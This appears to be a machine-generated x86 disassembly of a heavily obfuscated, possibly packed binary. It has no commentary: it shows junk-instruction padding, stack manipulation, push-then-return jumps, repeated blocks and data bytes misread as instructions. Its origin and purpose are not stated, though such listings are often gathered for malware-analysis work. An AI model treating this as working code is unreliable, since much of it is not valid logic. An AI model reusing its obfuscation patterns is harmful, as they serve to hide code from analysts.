sub_420015
mov [ esp ] 0xd17ef5d0
mov [ esp + 0x8 ] cl
lea esp [ esp + 0x28 ]
jne rwxdata
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
pushad
pushfd
pushad
mov [ esp + 0x4 ] ch
lea esp [ esp + 0x44 ]
jmp rwxdata
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sub_420051
mov [ esp ] dl
dec eax
mov [ esp ] 0x8ee1
push [ esp ]
call sub_42242b
add [ eax ] al
push ebx
je rwxdata
cmc
outsb
dec edi
inc si
imul ebp [ ebp ] 0x72657375
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
xor dh [ 0xffffffffe1144c36 ]
insd
lodsb [ esi ]
fcom [ eax - 0x3dac9ae7 ]
add eax 0xc760183f
clc
jb rwxdata
popad
outsb
insb
inc ebx
outsd
jne rwxdata
shl ebp 0x41
cmp eax 0xf56115c9
popad
jo rwxdata
je j_sub_4314f7
scasb [ edi ]
jb rwxdata
imul edi [ edx + 0x65 ] 0x32830f00
sub [ eax ] al
add [ esi - 0x4ffd4c3d ] al
sub ebp ecx
pop esp
add [ eax ] al
pushad
ror al 0x1
push edx
test bl cl
test bl 0x12
add al 0x2e
call sub_422f5e
add [ eax ] al
push edx
popad
inc esi
imul ebp [ ebp ] 0xc2444c6
pop edx
outsd
outsb
dec ecx
cli
outsb
inc edx
test dl 0x45
bound esp [ edx + 0x6b ]
or al 0x80
mov ah 0x88
outsd
inc esi
push ebx
and [ edx - 0x4b4c345c ] bl
dec edi
pop es
add al 0xdf
mov esp 0xc4172c37
inc ebx
daa
popad
je rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
popad
hlt
loope rwxdata
inc edx
jns rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
jmp rwxdata
and al 0x24
je rwxdata
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

outsb
outsw
jb rwxdata
imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
cmc
add [ edi + ebx ] ax
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_420174
push 0xee0951c3
pushfd
[ edi ] [ esi ]
push 0xd7e747f8
mov esi [ esp + 0x38 ]
push [ esp + 0x4 ]
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_42026e
lea esp [ esp + 0x8 ]
jne rwxdata
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
pushfd
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_420510
pushad
lea esp [ esp + 0x2c ]
ja rwxdata
or bl 0xfc
xchg ebp eax
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
dec bl
jpo rwxdata
push 0x830ed501
dec bl
call sub_42294b
dec bl
inc ecx
inc bl
setno bl
pushad
inc ecx
pushfd
shl bl cl
xchg ebp eax
xchg bl ah
bsr ax dx
mov eax ebp
test ch ah
dec bl
pushfd
setbe bl
mov bl 0x1
stc
mov [ esp + 0x24 ] esi
shrd esi eax cl
jmp rwxdata
btc si cx
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_420614
lea esp [ esp + 0x10 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
movsx si cl
or si bp
shl si 0xe
add edi ebx
bsf si dx
mov esi [ edx ]
pushfd
test al ah
mov [ esp ] 0xa1
test esi esi
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
inc ah
mov esi edi
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
stc
call sub_425618
add [ eax ] al
push edx
inc ebx
insb
outsd
jae rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
and al 0x20
dec ebx
jns rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
push 0x3a89aed7
call sub_4320dd
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_420667
stc
test ah 0x8c
mov [ esp + 0x4 ] ax
mov [ esp + 0x1c ] esi
bt dx di
call sub_422ea8
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_4208c7
test cl dh
add esp 0x4
jpe rwxdata
jmp rwxdata
add esi ebx
push 0xdbc3b77c
pushad
push [ esp ]
lea esp [ esp + 0x28 ]
jmp rwxdata
add esi ebx
pushfd
push 0x418dd011
lea esp [ esp + 0x8 ]
jmp rwxdata
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_4208e6
call sub_4250d6
push 0x983cd9a2
cmc
ror dl 0x1
push [ esp ]
push [ esp ]
stc
add dl 0x2e
pushad
clc
bt di 0xe
clc
neg dl
mov [ esp + 0x8 ] esi
pushfd
stc
mov [ esp ] ecx
sub dl 0x4f
call sub_4265f4
fdivrp st2
xchg esi eax
bound esp [ esi - 0x9515a56 ]
0x7c211495 0x64fe
sub_420983
mov ebx [ esp + 0x8 ]
mov cl 0x42
push ebx
jmp rwxdata
pop ecx
mov ecx [ esp + 0xc ]
jmp rwxdata
mov [ esp + 0xc ] 0x8e
mov esp ebp
movzx bp dl
pop ebp
pushad
pushad
push [ esp + 0x40 ]
retn 0x44
sub_421e6d
bt si bx
pushfd
mov [ esp ] sp
mov [ ebp - 0x8 ] eax
lahf
setle ah
mov eax [ esi ]
mov [ esp + 0x4 ] 0x37
pushfd
pushfd
test eax eax
pushad
jmp rwxdata
lea esp [ esp + 0x30 ]
je rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
bt sp ax
pushad
test eax 0x80000000
pushfd
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
push [ esp ]
call sub_422a89
add [ eax ] al
dec esp
inc ebx
dec ebp
popad
jo rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
push ecx
pop ecx
pop ecx
mov [ 0xffffffff8bf13af5 ] eax
je rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
adc al 0x70
insb
imul ebp [ esi + 0x67 ] 0x41
push edx
push ebx
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
movzx esi bl
clc
rol si cl
add edi ebx
nop
int3
add bh [ 0x701354f0 ]
or cl [ esi ]
popad
insb
jne rwxdata
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
stosd [ edi ]
xor bl ch
cmp [ ebx + 0x20 ] cl
jmp rwxdata
inc ebp
js rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
loopne rwxdata
shl [ edx + 0x14 ] 0x11
push 0x6c701415
cmc
cmp dh cl
mov eax edi
mov esp 0x53f75504
cmp al 0xac
mov al [ 0xfffffffff03d026a ]
push esp
adc esi [ eax + 0xa ]
push cs
add [ eax - 0x1e ] ch
scasb [ edi ]
mov ecx 0xf3dbe82b
add [ eax ] al
into
mov ah 0x8a
push ss
bt ecx 0x19
jmp rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
adc al 0x54
adc ebx [ esi ]
mov [ esp ] ebx
ror al 0x1
pushfd
test dl 0xe3
pushfd
add al 0x2e
stc
mov [ esp + 0x4 ] dx
add esp 0x3c
jae rwxdata
pushfd
setl al
lodsb [ esi ]
mov [ esp ] 0x1c135414
mov [ esp ] bx
push 0x983cd9a2
cmc
ror dl 0x1
push [ esp ]
push [ esp ]
stc
add dl 0x2e
pushad
clc
bt di 0xe
clc
neg dl
mov [ esp + 0x8 ] esi
pushfd
stc
